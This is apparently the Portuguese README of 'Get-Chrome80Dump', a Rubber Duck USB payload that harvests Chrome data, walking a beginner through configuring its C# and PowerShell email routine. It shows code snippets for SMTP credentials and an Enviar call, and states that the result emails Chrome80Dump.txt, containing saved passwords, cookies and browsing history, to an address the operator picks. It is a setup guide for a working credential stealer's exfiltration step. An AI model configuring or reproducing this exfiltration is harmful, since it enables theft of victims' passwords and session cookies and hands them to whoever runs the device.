# Get-Chrome80Dump
Demonstração de um Rubber Duck que captura algumas informações do navegador. 

## Explicacao para mim que sou iniciante ;)
Você deve substituir alguns valores no código na parte que configura o envio do e-mail, especificamente dentro da classe `Email` em C#. Estes valores incluem suas informações de login de e-mail, servidor SMTP, porta, e outros detalhes relacionados ao envio do e-mail. Vamos ver o que exatamente você precisa modificar:

### Localize a Parte do Código a Ser Modificada
Essa parte do código está perto do final, dentro do bloco `metodoEmail`, que contém o código C#:

```csharp
private static string _usuario = "USUARIO DO EMAIL"; //ALTERE
private static string _senha = "SENHA DO EMAIL"; //ALTERE
private static string _smtp = "SMTP"; //ALTERE
private static int _porta = PORTA; //ALTERE
```

### O Que Modificar:

1. **_usuario**: Substitua `"USUARIO DO EMAIL"` pelo seu endereço de e-mail.
   - Exemplo: `"meuemail@gmail.com"`

2. **_senha**: Substitua `"SENHA DO EMAIL"` pela senha do seu e-mail.
   - Exemplo: `"minhasenha123"`

   - **Nota importante**: Para muitos provedores de e-mail (como Gmail), você não pode simplesmente usar a senha normal da sua conta. Você precisará criar uma **senha de aplicativo** se estiver usando autenticação de dois fatores (2FA). Por exemplo, no Gmail, você pode gerar uma senha específica para aplicativos que pode ser usada aqui.

3. **_smtp**: Substitua `"SMTP"` pelo servidor SMTP do seu provedor de e-mail.
   - Para o Gmail, use: `"smtp.gmail.com"`
   - Para o Outlook, use: `"smtp-mail.outlook.com"`

4. **_porta**: Substitua `PORTA` pela porta SMTP correta para seu provedor de e-mail.
   - Para o Gmail (SSL), use: `465`
   - Para o Gmail (TLS), use: `587`
   - Para o Outlook, use: `587`

### Exemplo Completo:
Aqui está como ficaria se você estivesse usando uma conta do Gmail:

```csharp
private static string _usuario = "meuemail@gmail.com"; // Seu endereço de e-mail
private static string _senha = "minhasenhaespecial"; // A senha de aplicativo ou a senha do seu e-mail
private static string _smtp = "smtp.gmail.com"; // Servidor SMTP do Gmail
private static int _porta = 587; // Porta TLS do Gmail (ou 465 para SSL)
```

### Modificar os Detalhes do Envio do E-mail:
Na chamada de método `Enviar`, você também deve substituir os seguintes parâmetros:

```powershell
$EnviaEmail.Enviar("NOME DO REMETENTE", "REMETENTE", "DESTINATÁRIO", "ASSUNTO", "TEXTO DO EMAIL", $OutFile)
```

Aqui está o que você deve modificar:

1. **"NOME DO REMETENTE"**: Substitua pelo nome que você quer que apareça como remetente do e-mail.
   - Exemplo: `"Seu Nome"`

2. **"REMETENTE"**: Substitua pelo seu endereço de e-mail (o mesmo que em `_usuario`).
   - Exemplo: `"meuemail@gmail.com"`

3. **"DESTINATÁRIO"**: Substitua pelo e-mail do destinatário (ou seja, o e-mail para o qual você deseja enviar os dados).
   - Exemplo: `"emaildoreceptor@gmail.com"`
   - **Nota**: Se você quiser enviar para mais de um destinatário, pode separar os e-mails por ponto e vírgula, como `"email1@gmail.com;email2@gmail.com"`.

4. **"ASSUNTO"**: Substitua pelo assunto do e-mail.
   - Exemplo: `"Relatório de Dados do Chrome"`

5. **"TEXTO DO EMAIL"**: Substitua pelo conteúdo do e-mail que você deseja enviar.
   - Exemplo: `"Segue o relatório de extração dos dados do Chrome."`

### Exemplo Completo:

Aqui está como a linha ficaria após todas as substituições:

```powershell
$EnviaEmail.Enviar("Seu Nome", "meuemail@gmail.com", "emaildoreceptor@gmail.com", "Relatório de Dados do Chrome", "Segue o relatório de extração dos dados do Chrome.", $OutFile)
```

### Considerações Finais:

- Certifique-se de que seu provedor de e-mail permite envios de SMTP. No caso do **Gmail**, por exemplo, pode ser necessário habilitar o "Acesso a apps menos seguros" ou usar uma senha de aplicativo.
- Verifique também a política de segurança do seu provedor de e-mail para garantir que ele permita esse tipo de acesso programático.

Após essas modificações, o código deverá enviar o arquivo `Chrome80Dump.txt` (contendo senhas, cookies, e histórico do Chrome) para o e-mail especificado.
